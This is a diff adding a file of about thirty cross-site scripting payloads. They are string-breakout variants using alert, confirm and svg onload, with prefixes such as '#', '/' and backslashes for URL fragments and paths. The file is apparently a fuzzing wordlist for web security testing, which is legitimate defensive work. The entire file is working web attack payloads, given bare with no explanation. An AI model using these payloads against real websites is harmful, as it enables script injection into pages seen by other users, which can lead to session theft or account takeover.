@@ -1,0 +1,30 @@
+#';alert('XSS');//
+#“-confirm`1`-”
+#\”-confirm`1`//
+#\”}})})-confirm`1`;({if(){/*///
+#\”}})})-confirm`1`;({({if(){/*///
+#\”}})})-confirm`1`(a=>{({b:{/*///
+#/”><svg onload=alert(1)>
+#<svg onload=alert(1)>
+';alert('XSS');//
+“-confirm`1`-”
+\”-confirm`1`//
+\”}})})-confirm`1`;({if(){/*///
+\”}})})-confirm`1`;({({if(){/*///
+\”}})})-confirm`1`(a=>{({b:{/*///
+/”><svg onload=alert(1)>
+<svg onload=alert(1)>
+/';alert('XSS');//
+/“-confirm`1`-”
+/\”-confirm`1`//
+/\”}})})-confirm`1`;({if(){/*///
+/\”}})})-confirm`1`;({({if(){/*///
+/\”}})})-confirm`1`(a=>{({b:{/*///
+//”><svg onload=alert(1)>
+/<svg onload=alert(1)>
+/”-confirm`1`//
+/”}})})-confirm`1`;({if(){/*///
+/”}})})-confirm`1`;({({if(){/*///
+/”}})})-confirm`1`(a=>{({b:{/*///
+\”><svg onload=alert(1)>
+\<svg onload=alert(1)>
